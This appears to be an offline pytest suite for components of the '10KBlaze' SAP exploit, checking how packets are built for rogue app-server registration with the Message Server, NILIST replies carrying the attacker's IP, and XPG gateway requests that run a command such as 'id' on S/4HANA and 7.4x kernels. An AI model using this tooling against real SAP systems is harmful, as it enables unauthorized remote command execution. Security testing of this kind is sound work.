"""Tests for 10KBlaze exploit components — offline, no network access.

Covers:
  - P1 lu_name parameter (SAP Note 975044 fix)
  - App-server name derivation for betrusted registration
  - DP info blob version selection (kernel 720/742/793)
  - NILIST IP reply (PULL model) for kernel 749+
  - Exploit packet composition for S4H (kernel 793) and W74 (kernel 742)
"""

import sys
import os
import socket
import struct

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    build_saprfc_header_v6, build_saprfcextend,
    build_saprf_dt_struct, build_sapcpic,
    pad_right, pad_right_null,
)
from sap_ms_betrusted import (
    _derive_appserver_name,
    build_dp_info, build_nilist_ip_reply,
    _nilist_ip_body, _adm_record,
    ADM_SELFIDENT, ADM_GET_NILIST_PORT,
    DP_VERSION_V11, DP_VERSION_V13, DP_VERSION_V14,
    DP_SIZE_V11, DP_SIZE_V13,
)


# ---------------------------------------------------------------------------
# P1 lu_name parameter (SAP Note 975044 fix)
# ---------------------------------------------------------------------------

class TestP1LuName:

    def test_default_lu_is_sapserv(self):
        p1 = build_p1("10.0.0.1", "00")
        lu_field = p1[30:38]  # lu at offset 30, 8 bytes
        assert lu_field == b"sapserv\x00"

    def test_default_lu_has_null_terminator(self):
        p1 = build_p1("10.0.0.1", "00")
        lu_field = p1[30:38]
        assert b"\x00" in lu_field, "lu field must contain a NUL terminator"

    def test_custom_lu_name(self):
        p1 = build_p1("10.0.0.1", "00", lu_name="ubuntu")
        lu_field = p1[30:38]
        assert lu_field[:6] == b"ubuntu"
        assert lu_field[6] == 0  # NUL terminator

    def test_lu_name_truncated_to_7(self):
        p1 = build_p1("10.0.0.1", "00", lu_name="longername")
        lu_field = p1[30:38]
        assert lu_field == b"longern\x00"

    def test_lu_dots_replaced_with_hyphens(self):
        p1 = build_p1("10.0.0.1", "00", lu_name="192.168.2.210")
        lu_field = p1[30:38]
        assert b"." not in lu_field
        assert lu_field[:7] == b"192-168"

    def test_lu_underscores_replaced_with_hyphens(self):
        p1 = build_p1("10.0.0.1", "00", lu_name="host_name")
        lu_field = p1[30:38]
        assert b"_" not in lu_field
        assert lu_field[:7] == b"host-na"

    def test_p1_total_size_unchanged(self):
        for lu in [None, "ubuntu", "a", "1234567"]:
            p1 = build_p1("10.0.0.1", "00", lu_name=lu)
            assert len(p1) == 64

    def test_service_field_unaffected_by_lu(self):
        p1_default = build_p1("10.0.0.1", "40")
        p1_custom = build_p1("10.0.0.1", "40", lu_name="ubuntu")
        assert p1_default[10:20] == p1_custom[10:20] == b"sapgw40   "


# ---------------------------------------------------------------------------
# App-server name derivation (betrusted --our-name)
# ---------------------------------------------------------------------------

class TestDeriveAppserverName:

    def test_format_with_sid(self):
        name = _derive_appserver_name("MSG_SERVER", 0,
                                       attacker_ip="192.168.2.210",
                                       target_sid="S4H")
        assert name.startswith("192_168_2_210_S4H_00_")
        assert len(name.split("_")) >= 6  # ip(4) + sid + inst + hash

    def test_ip_dots_become_underscores(self):
        name = _derive_appserver_name("MSG_SERVER", 0,
                                       attacker_ip="10.0.1.2",
                                       target_sid="S4H")
        assert name.startswith("10_0_1_2_")

    def test_instance_zero_padded(self):
        name = _derive_appserver_name("MSG_SERVER", 3,
                                       attacker_ip="10.0.0.1",
                                       target_sid="ABC")
        assert "_ABC_03_" in name

    def test_sid_extracted_from_ms_name(self):
        name = _derive_appserver_name("s4hanadev_S4H_01_ms", 0,
                                       attacker_ip="10.0.0.1")
        assert "_S4H_" in name

    def test_unique_suffix_per_call(self):
        names = set()
        for _ in range(10):
            n = _derive_appserver_name("MSG_SERVER", 0,
                                        attacker_ip="1.2.3.4",
                                        target_sid="TST")
            names.add(n)
        assert len(names) == 10, "Each call should produce a unique name"

    def test_fallback_hostname_without_ip(self):
        name = _derive_appserver_name("MSG_SERVER", 0, target_sid="X")
        assert name.startswith("sapmap_")

    def test_no_sid_uses_ip_plus_instance(self):
        name = _derive_appserver_name("MSG_SERVER", 5,
                                       attacker_ip="10.0.0.1")
        # MSG_SERVER has no SID segment → fallback to hostname_NN_hash
        assert "10_0_0_1_05_" in name


# ---------------------------------------------------------------------------
# DP info blob — kernel version selection
# ---------------------------------------------------------------------------

class TestDpInfoKernelVersions:

    def test_dp_version_11_for_kernel_720(self):
        blob = build_dp_info("server", 0, DP_VERSION_V11)
        assert len(blob) == DP_SIZE_V11  # 203 bytes
        assert blob[1] == 11

    def test_dp_version_13_for_kernel_742(self):
        blob = build_dp_info("server", 40, DP_VERSION_V13)
        assert len(blob) == DP_SIZE_V13  # 507 bytes
        assert blob[1] == 13

    def test_dp_version_14_for_kernel_793(self):
        blob = build_dp_info("server", 0, DP_VERSION_V14)
        assert len(blob) == DP_SIZE_V13  # same wire size as v13
        assert blob[1] == 14

    def test_attacker_ip_at_dp_addr_from(self):
        for ver in [DP_VERSION_V11, DP_VERSION_V13, DP_VERSION_V14]:
            blob = build_dp_info("server", 0, ver, attacker_ip="192.168.2.210")
            ip_bytes = socket.inet_aton("192.168.2.210")
            assert ip_bytes in blob

    def test_server_name_in_blob(self):
        blob = build_dp_info("ubuntu_S4H_00_ab12", 0, DP_VERSION_V13)
        assert b"ubuntu_S4H_00_ab12" in blob


# ---------------------------------------------------------------------------
# NILIST IP reply (PULL model, kernel 749+)
# ---------------------------------------------------------------------------

class TestNilistIpReply:

    def test_contains_4_records(self):
        pkt = build_nilist_ip_reply(
            "fake_server", b"\x00" * 8,
            toname="s4hanadev_S4H_00",
            attacker_ip="192.168.2.210",
        )
        # 4 ADM records (104 bytes each). The extended ADM header for kernel
        # 749+ has 2 extra bytes (version/flags) after the eye-catcher → 36B.
        # Total: 110 (MS hdr) + 36 (ext ADM hdr) + 4*104 = 562
        assert len(pkt) == 110 + 36 + 4 * 104

    def test_selfident_opcode_present(self):
        pkt = build_nilist_ip_reply(
            "fake_server", b"\x00" * 8,
            toname="s4hanadev_S4H_00",
            attacker_ip="10.0.0.1",
        )
        # SELFIDENT (0x13) must appear somewhere in the record area
        rec_area = pkt[146:]  # 110 + 36 = 146
        assert ADM_SELFIDENT in rec_area

    def test_nilist_port_opcodes_present(self):
        pkt = build_nilist_ip_reply(
            "fake_server", b"\x00" * 8,
            toname="s4hanadev_S4H_00",
            attacker_ip="10.0.0.1",
        )
        rec_area = pkt[146:]
        # 3 records with ADM_GET_NILIST_PORT (0x3c)
        count = sum(1 for i in range(0, len(rec_area), 104) if rec_area[i:i+1] == bytes([ADM_GET_NILIST_PORT]))
        assert count >= 3

    def test_attacker_ip_in_last_record(self):
        ip = "192.168.2.210"
        pkt = build_nilist_ip_reply(
            "fake_server", b"\x00" * 8,
            toname="s4hanadev_S4H_00",
            attacker_ip=ip,
        )
        ip_bytes = socket.inet_aton(ip)
        last_rec = pkt[144 + 3 * 104:]
        assert ip_bytes in last_rec

    def test_loopback_ips_in_middle_records(self):
        pkt = build_nilist_ip_reply(
            "fake_server", b"\x00" * 8,
            toname="s4hanadev_S4H_00",
            attacker_ip="10.0.0.1",
        )
        rec2 = pkt[144 + 104: 144 + 2 * 104]
        rec3 = pkt[144 + 2 * 104: 144 + 3 * 104]
        assert socket.inet_aton("127.0.0.1") in rec2
        assert socket.inet_aton("127.0.0.2") in rec3

    def test_toname_in_header(self):
        pkt = build_nilist_ip_reply(
            "fake_server", b"\x00" * 8,
            toname="s4hanadev_S4H_00",
            attacker_ip="10.0.0.1",
        )
        toname_field = pkt[14:54]
        assert b"s4hanadev_S4H_00" in toname_field


# ---------------------------------------------------------------------------
# NILIST IP body (99-byte kernel 745+ format)
# ---------------------------------------------------------------------------

class TestNilistIpBody:

    def test_body_is_99_bytes(self):
        body = _nilist_ip_body("192.168.2.210")
        assert len(body) == 99

    def test_ip_embedded(self):
        ip = "10.20.30.40"
        body = _nilist_ip_body(ip)
        assert socket.inet_aton(ip) in body

    def test_subnet_mask_present(self):
        body = _nilist_ip_body("1.2.3.4")
        mask = socket.inet_aton("0.0.255.255")
        assert mask in body


# ---------------------------------------------------------------------------
# P2 long_lu — hostname vs IP for target identification
# ---------------------------------------------------------------------------

class TestP2LongLu:

    def test_target_hostname_in_long_lu(self):
        p2 = build_p2("10.0.0.1", target_hostname="s4hanadev")
        assert b"s4hanadev" in p2

    def test_ip_fallback_uses_hyphens(self):
        p2 = build_p2("10.0.0.1")
        assert b"10-0-0-1" in p2
        assert b"10.0.0.1" not in p2[48:]  # long_lu should not have dots

    def test_hostname_for_s4h(self):
        p2 = build_p2("192.168.2.209", target_hostname="s4hanadev")
        assert b"s4hanadev" in p2

    def test_hostname_for_w74(self):
        p2 = build_p2("192.168.2.29", target_hostname="WINWAS740")
        assert b"WINWAS740" in p2


# ---------------------------------------------------------------------------
# Exploit packet sizes — S4H vs W74 configurations
# ---------------------------------------------------------------------------

class TestExploitPacketSizes:

    def test_p1_always_64_bytes(self):
        assert len(build_p1("192.168.2.209", "00")) == 64
        assert len(build_p1("192.168.2.29", "40")) == 64

    def test_p2_always_452_bytes(self):
        assert len(build_p2("192.168.2.209")) == 452
        assert len(build_p2("192.168.2.29", target_hostname="WINWAS740")) == 452

    def test_p3_fixed_size(self):
        p3 = build_p3("conv123", "192.168.2.209", "s4hanadev", "S4H", "00",
                       "793_REL", "T_75", "000", "id", "")
        assert len(p3) > 0

    def test_p4_fixed_size(self):
        p4 = build_p4("conv123", "192.168.2.209", "s4hanadev", "S4H", "00",
                       "793_REL", "T_75", "000")
        assert len(p4) > 0


# ---------------------------------------------------------------------------
# Server name parsing — hostname extraction by SAP dispatcher
# ---------------------------------------------------------------------------

class TestServerNameHostnameExtraction:
    """SAP extracts hostname from server name by stripping _<SID>_<NN>[_<hash>].
    These tests verify our naming convention produces resolvable hostnames."""

    @staticmethod
    def _extract_hostname(server_name):
        parts = server_name.split("_")
        # SAP looks for SID (2-4 uppercase chars) and strips from there
        for i, p in enumerate(parts):
            if 2 <= len(p) <= 4 and p.isupper() and any(c.isalpha() for c in p):
                return "_".join(parts[:i])
        return server_name

    def test_ubuntu_s4h_00_extracts_ubuntu(self):
        assert self._extract_hostname("ubuntu_S4H_00") == "ubuntu"

    def test_ubuntu_s4h_00_hash_extracts_ubuntu(self):
        assert self._extract_hostname("ubuntu_S4H_00_ab12") == "ubuntu"

    def test_ubuntu_w74_40_extracts_ubuntu(self):
        assert self._extract_hostname("ubuntu_W74_40_ff00") == "ubuntu"

    def test_ip_underscore_name_extracts_ip(self):
        assert self._extract_hostname("192_168_2_210_S4H_00_eb33") == "192_168_2_210"

    def test_resolvable_hostname_is_key(self):
        """The extracted hostname must be DNS-resolvable on the target.
        192_168_2_210 is NOT a valid hostname → exploit fails.
        'ubuntu' IS in /etc/hosts → exploit succeeds."""
        ip_name = self._extract_hostname("192_168_2_210_S4H_00")
        dns_name = self._extract_hostname("ubuntu_S4H_00")
        assert ip_name == "192_168_2_210"  # not resolvable
        assert dns_name == "ubuntu"  # resolvable via /etc/hosts
